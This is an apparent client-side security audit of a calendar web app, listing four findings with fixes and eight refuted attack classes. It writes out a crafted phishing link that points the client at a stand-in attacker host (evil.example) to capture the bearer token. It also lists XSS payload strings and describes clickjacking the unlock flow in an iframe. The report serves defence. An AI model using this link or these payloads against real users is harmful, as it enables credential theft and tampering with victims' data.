# S5 — Client-Side / GitHub Pages Attack Surface — Audit Findings

**Target:** Calendar-Web PoC — LIVE client `https://sh-clock.github.io/Calendar-Web/`, LIVE worker `https://calendar-poc.sh-clock.workers.dev`, repo `/home/z/my-project/calendar-web`.
**Agent:** S5 (client-side). **Date:** 2026-11-01.
**Method:** full read of `index.html`, `js/app.js` (3911 lines), `js/api.js`, `js/crypto.js`, `js/ical.js`, `js/calendar-core.js`, `css/style.css` (context) + live Playwright probes against the LOCAL stack (private ports 8099/8799, `--fresh` disposable universe, rows `evt:sec-S5-*` / `cmeta:11111111-…-555555555555` only, all deleted afterwards) + read-only probes against the LIVE site (headers, iframe rendering, byte-compare). LIVE worker was never written to.

**Deployed-code identity (validity of this audit):** every live file is byte-identical to the repo (`sha256` match for `index.html`, `js/app.js`, `js/api.js`, `js/crypto.js`, `js/ical.js`, `js/calendar-core.js`, `css/style.css`) — the audited code IS the deployed code.

**Probe artifacts** (all in `audit-d/s5/`): `probe-xss.mjs` (38/38 ok), `probe-server-param.mjs` (15/15 ok), `probe-localstorage.mjs` (23/23 ok), `probe-clickjack.mjs` (10/10 ok), `s5-stack.sh` (private stack runner), screenshots `s5-clickjack-local.png`, `s5-clickjack-live.png`, `s5-xss-final.png`, `live-headers.txt`. Re-run: `bash audit-d/s5/s5-stack.sh node audit-d/s5/probe-xss.mjs` etc.

**Severity counts: 1 HIGH · 2 MEDIUM · 1 LOW.** Plus 7 verified-secure / refuted attack classes.

---

## FINDINGS

### F-1 [HIGH] Crafted `?server=` link silently repoints the client at an attacker server → full AUTH_UI bearer exfiltration

**Code path (verified, live byte-identical):**
- `js/app.js:649-650` — `ingestParams()`: `const srv = hash.get('server') || params.get('server'); if (srv && /^https?:\/\//.test(srv)) safeSetItem(LS_SERVER, srv.replace(/\/+$/,''))`. **Any** `http(s)://` URL is persisted to `localStorage.clock_poc_server` with **no allowlist, no confirmation, no warning** (only the scheme is checked; `http://` cleartext is accepted — probe C1).
- `js/app.js:658-661` — `unlock()` sends every request to that URL; `js/api.js:29+37` — the only fetch construction in the client: `fetch(this.base + path, { headers: { authorization: 'Bearer ' + this.token }})`.
- The stored value silently pre-fills the login form (`refreshLoginUi`, `js/app.js:3720`) — a small input most users never re-read.
- `js/app.js:690-693` — when the attacker proxies the REAL `/config` (forwarding the victim's `Authorization` header, exactly what a MITM does), `authUiHex === token`, the "code does not match" warning never fires, and the client keeps using the attacker as its API endpoint.

**Live-verified attack chain (local stack, disposable universe, `probe-server-param.mjs` A1–A9, B1–B3, C1–C3 — all passed):**
1. Victim opens ONE link: `http://127.0.0.1:8099/index.html?server=http://127.0.0.1:9777/&setup=<AUTH_UI>` (on the live site this is simply `https://sh-clock.github.io/Calendar-Web/?server=https://evil.example/` — no `setup=` needed if the victim already unlocked once on that browser).
2. `?server=` persisted silently (`A1`); URL cleaned by `replaceState` so nothing looks wrong (`A4`); form prefilled with the attacker URL (`A3`).
3. Victim types their password and clicks Unlock. First request: `GET /config` → attacker, carrying `Authorization: Bearer <stored AUTH_UI>` (`A6` — captured verbatim). **The stored token is the full §4 'ui' bearer** (store.js: read manifests, read/PUT/DELETE rows).
4. Attacker proxies `/config` from the real worker → unlock SUCCEEDS with zero warnings (`A8`); every subsequent call (`/version`, `/rows`, PUTs) flows to the attacker with the DERIVED AUTH_UI bearer (`A7`).
5. Variant `#server=` in the fragment works identically (`B1/B3`) and never appears in any server log; `http://` accepted (`C1`); an unreachable attacker URL still receives the dial + bearer (`C2` — request emitted to `127.0.0.1:9`).
6. `history` does not retain the link (`A9`).

**Impact:** the attacker obtains the victim's complete API credential. Confidentiality of row *contents* survives (K_data never leaves the browser — E2EE holds), but the attacker gains full ciphertext **read**, **overwrite** (future-injection / rollback-style corruption of the victim's calendar) and **delete** access, plus an indefinite silent MITM position (the poisoned `clock_poc_server` persists until the victim manually changes it or clicks "Forget browser"). Phishing-grade delivery: one link, no user-visible anomaly.

**Fix (concrete):**
- Do **not** accept a server override from URL parameters at all — provisioning links should only ever carry `#setup=` (already supported, `js/app.js:642`). If a `?server=` flow must exist, require an explicit confirmation dialog ("This link wants to change your server to X — allow?") before writing `LS_SERVER`, and reject non-`https` and non-allowlisted hosts.
- On unlock, show a persistent banner when `LS_SERVER !== DEFAULT_SERVER_URL`.
- Optionally bind the server URL into the protocol's config row so a token is only valid for its own server (server-side enforcement in the DO bearer gate).

---

### F-2 [MEDIUM] `?setup=` provisioning token travels in the URL **query** → lands in static-host access logs (GitHub Pages CDN / Fastly / intermediaries)

**Code path:** `js/app.js:642-651` — `const setup = hash.get('setup') || params.get('setup')` — the query variant is accepted. `history.replaceState(null, '', location.pathname)` (line 651) cleans the visible URL and the history entry (VERIFIED — probe A4: address bar clean, A9: `goBack()` never returns to the token URL), but **only after the page has already been fetched**.

**Verified evidence:**
- Probe A5: the initial document request line contains `…?server=…&setup=<full 64-hex token>` — captured on the static server request.
- LIVE site: `curl -sI 'https://sh-clock.github.io/Calendar-Web/?setup=<dummy-64-hex>'` → **200**; response headers show the multi-layer logging/caching infrastructure that sees full request URLs: `server: GitHub.com`, `x-github-request-id: …`, `x-github-edge-region: southeastasia`, `via: 1.1 varnish`, `x-served-by: cache-hkg-…`, `x-fastly-request-id: …` (`audit-d/s5/live-headers.txt`).
- `/Calendar-Web?setup=…` (no trailing slash) → **301** redirect (a second logged request; browsers replay the query).
- The token also sits in the address bar / screen-shares / shoulder-surfing until JS runs, and stays there forever if the module fails to load (JS disabled, blocked, or a syntax error).

**Impact:** the AUTH_UI bearer (see F-1 for its power) is exposed to: GitHub/Fastly edge-log accessors, corporate HTTP(S) proxies and TLS-inspecting middleboxes, browser-sync/history databases on some implementations (hypothesis — `replaceState` reliably rewrites the current history entry in Chromium (verified), but implementation-specific URL autocomplete stores are not guaranteed clean).

**Fix:** generate provisioning links with the **fragment** form only — `…/index.html#setup=<token>` — which the client already accepts (`hash.get('setup')`) and which is never sent to any server (VERIFIED: probe B2, no token in any request line). Remove the query-string branch, or at minimum document that `?setup=` links are log-leaking.

---

### F-3 [MEDIUM] No CSP / X-Frame-Options / Referrer-Policy / X-Content-Type-Options / Permissions-Policy → live client is fully frameable (clickjacking of the unlock and destructive flows VERIFIED)

**Verified evidence:**
- LIVE response headers (`audit-d/s5/live-headers.txt`): only `strict-transport-security: max-age=31556952` (good) and `access-control-allow-origin: *`. **No** `content-security-policy`, **no** `x-frame-options`, **no** `frame-ancestors`, **no** `referrer-policy`, **no** `x-content-type-options: nosniff`, **no** `permissions-policy`. (GitHub Pages serves none by default.)
- LIVE clickjack probe (`probe-clickjack.mjs` B1–B4, 10/10): the live site **renders inside a third-party iframe** and is **interactive** — password typed into the frame from the embedding page (B2), Unlock button clicked in-frame (B3, client-side no-token early return; no live writes), provisioning input + "Store" clicked in-frame (B4). Screenshot: `s5-clickjack-local.png` / `s5-clickjack-live.png`.
- LOCAL full-flow probe (A1–A6): the **entire unlock** — password submission, key derivation, sync, calendar render — completed **inside the attacker's iframe**, and the attacker page then drove the victim app UI ("New event" editor opened from the framed app). A framed 127.0.0.1 parent is a valid secure context (WebCrypto works in-frame, A3); an `https://` attacker page is equally trustworthy, so this works against the live site for any already-provisioned victim.

**Impact:** classic overlay/UI-redress clickjacking: an attacker page can frame the real app, hide the URL, and trick the victim into unlocking "their calendar" inside the frame, then drive destructive affordances (Delete event / Delete calendar / calendar moves) with overlaid "claim your prize" art. No frame-busting code exists anywhere in `js/app.js` (grep: no `top !== self` / `window.top` usage). Absence of CSP also removes defense-in-depth for any future HTML-injection bug (F-XSS is currently refuted, but one `innerHTML` regression away from full compromise — no inline-script blocker).

**Fix (GitHub Pages cannot set headers):**
- JS frame-busting in `index.html` head: `if (self !== top) { top.location = self.location; }` (or refuse to render + show a "framed" warning). This is the primary practical mitigation on a static host.
- Add `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; ...">` for defense-in-depth against future injection bugs (all scripts are same-origin external files; the theme-boot IIFE must move to a file or be allowed explicitly). NOTE: `frame-ancestors` is NOT honored in `<meta>` CSP (spec restriction) — the JS guard above covers framing; real `frame-ancestors`/`X-Frame-Options` would need a header-serving host (e.g. move Pages behind a header-adding proxy or accept the JS guard).
- Add `<meta name="referrer" content="no-referrer">` (belt & braces for F-2).

---

### F-4 [LOW] Plaintext-at-rest by design: decrypted model cache + bearer token + offline password oracle in `localStorage`; no idle auto-lock

**Verified evidence (`probe-localstorage.mjs`, 23/23):**
- Keys after unlock: `clock_poc_auth_ui` (64-hex bearer), `clock_poc_cache_v45` (**fully decrypted** model — `SUMMARY:S5 plaintext probe event` readable verbatim at rest), `clock_poc_cfg_v45` (`{salt, iters, wrapped}` — a complete offline password-guessing oracle), `clock_poc_server`, `clock_poc_calvis_v42`.
- Token does NOT leak into the cache/settings/cfg (verified string search).
- **Purge paths work:** `lock()` (topbar button) purges `clock_poc_cache_v45` (keeps token + cfg — browser stays provisioned, by design); reload after lock keeps it purged; failed/wrong-password unlock neither writes nor purges the cache; **Forget browser** removes token/server/calvis/cfg and purges the cache via `lock()`.
- **Gap:** there is **no idle/timeout auto-lock anywhere** (`grep` — the only timers are autosync 60 s and day-rollover 60 s, `js/app.js:3868-3885`). An unlocked tab left on screen (or closed without Lock) leaves the full plaintext calendar on disk indefinitely; a shared-computer attacker (or any future XSS/browser extension) reads titles, descriptions, locations and the API bearer directly.

**Impact:** bounded — requires local/disk access or a compromised extension since XSS is refuted (below) — but it silently widens the "Lock protects my data" mental model: Lock purges, but *nothing* triggers Lock automatically, and a page-close does not.

**Fix:** add an idle auto-lock (e.g. 15 min inactivity → `lock()`), optionally gated by a setting; consider `sessionStorage`-backed cache or encrypting `clock_poc_cache_v45` under a key held only while unlocked; document the LS_CFG offline-oracle trade-off (it is what enables offline unlock — accepted protocol risk, but should be stated).

---

## VERIFIED-SECURE (refuted attack classes, with evidence)

1. **XSS via decrypted row content — REFUTED at every sink.** The zero-knowledge server cannot sanitize, but the client never parses attacker strings as HTML:
   - `el()` helper (`js/app.js:140-154`) uses `document.createElement` + `textContent` (`text` prop) + `setAttribute` — **no innerHTML for data**; all 26 `innerHTML` assignments in `app.js` are **static SVG icon constants** (grep-verified list at lines 1899, 1906, 1911, 1939-1940, 2203, 2231, 2257, 2264, 2276, 2291, 2342, 2363, 2376, 2409, 3194, 3235, 3500, 3515, 3540, 3573, 3599, 3615, 3636, 3652, 3666); the only interpolated-looking one (`iconRow`, line 1939-1940) interpolates from a fixed 4-key icon dictionary.
   - **No `eventContent` option is passed to FullCalendar** (grep: only `eventDidMount`); FC v7/preact renders `title` strings as text nodes; the task checkbox (`.fc-task-check`) is built with `el()` and prepended (`js/app.js:1490-1516`) — **not** innerHTML.
   - **Live payload proof (`probe-xss.mjs`, 38/38):** crafted encrypted rows (`evt:sec-S5:1..5` + a cmeta calendar) carrying `<img src=x onerror=window.__xss.push(…)>`, `"><svg onload=…>`, `x' onclick='…`, `javascript:…` LOCATION, `<iframe srcdoc="&lt;script&gt;…">` + `<img onerror>` DESCRIPTION, an XSS calendar NAME, and a crafted custom RRULE — rendered through **month grid chips, sidebar calendar list (incl. the `aria-label` setAttribute path), event popover (title/location/description), editor prefill (input `value` — no attribute breakout), frequency select CUSTOM label, the freq-modal itself, the task checkbox + completion RMW round-trip, the agenda (listYear) view, and a reload through the local-first cache hydrate**. `window.__xss` stayed **empty** in every phase; `document.images` stayed 0; zero injected iframes; zero console/page errors; every payload appeared **as literal text** (e.g. popover `textContent === '<img src=x onerror=…>'`).
2. **Token flow discipline.** Exactly one network construction point exists in the client (`js/api.js:37`, `fetch(this.base + path)` with the bearer header); no XHR/WebSocket/EventSource/sendBeacon anywhere (grep). The token is never serialized into the cache, settings, cfg, or any URL the app builds (probe-verified string search). The only leak channels are F-1 (attacker-chosen `base`) and F-2 (provisioning URL) above.
3. **`javascript:` URLs — inert.** Rendered as text in popover/editor (verified); the app creates no anchors/hrefs from event data (grep: no `window.open`, no `location.href =` with data).
4. **`history.replaceState` hygiene — works as claimed:** address bar cleaned (A4), history back never returns to the token URL (A9); the residual leaks are the pre-JS request line (F-2), not history.
5. **Dependency/supply-chain integrity — clean.** `index.html` references only same-origin relative resources (`css/style.css`, `js/vendor/fullcalendar/v7/skeleton.css`, `js/vendor/rrule.mjs` modulepreload, `js/vendor/fullcalendar/v7/all.global.js`, `js/app.js`); every dynamically injected URL is `FC_VENDOR + '/themes/…'` (same-origin, `js/app.js:446-530`) with flavor/palette values validated against fixed allowlists (`loadSettings`, lines 397-405); the only absolute URL in first-party JS is `DEFAULT_SERVER_URL`; CSS contains no external `url()` (only `data:` SVG masks); no CDN, no third-party, no SRI-less includes. Live files are byte-identical to the repo (sha256, 7/7).
6. **Crypto hygiene — clean.** Native WebCrypto throughout (`crypto.js`); fresh 12-byte nonces via `crypto.getRandomValues` (line 163); `crypto.randomUUID()` for ids; strict hex/base64 validation; **no `Math.random`, no `eval`, no `new Function`, no `document.write`, no string-`setTimeout`** in any first-party js file (grep; `Math.random` appears only inside the vendored preact bundle for internal event keys — not used for any cryptographic purpose).
7. **Lock/Forget purge semantics — as documented.** `lock()` purges the plaintext cache, clears in-memory state, `removeAllEvents()`, nulls the editor target (E5-5, `js/app.js:771-802`); `forgetBrowser()` additionally removes token/server/calvis/cfg (`js/app.js:804-815`); a locked-during-sync aborts silently (A7 guards). All observed live in the purge probe.
8. **Server URL scheme gate:** `javascript:`/`data:`/`file:` server URLs are rejected by the `^https?://` test (probe C3) — the weakness is that any `http(s)` host passes (F-1), not that script URLs pass.

---

## Top summary

| Sev | Count | Findings |
|-----|-------|----------|
| HIGH | 1 | F-1 `?server=` crafted-link → silent server override + AUTH_UI bearer exfiltration (end-to-end verified) |
| MEDIUM | 2 | F-2 `?setup=` token in URL query → static-host/CDN/proxy log leakage; F-3 no frame-busting/CSP headers → verified clickjacking of the full unlock + editor flows |
| LOW | 1 | F-4 plaintext cache + bearer + offline oracle at rest in localStorage; no idle auto-lock (lock/forget purge verified working) |

**Refuted:** XSS in every audited sink (38/38 checks, zero executions), token side-channels beyond F-1/F-2, `javascript:` URL activation, CDN/supply-chain exposure, weak randomness, `eval`/`document.write`.

**Recommended priority:** fix F-1 (drop/confirm `?server=`) and F-2 (fragment-only setup links) first — both are one-line-ish client changes; then F-3 (frame-busting + meta CSP); F-4 is a documented design trade-off with a cheap idle-lock mitigation.
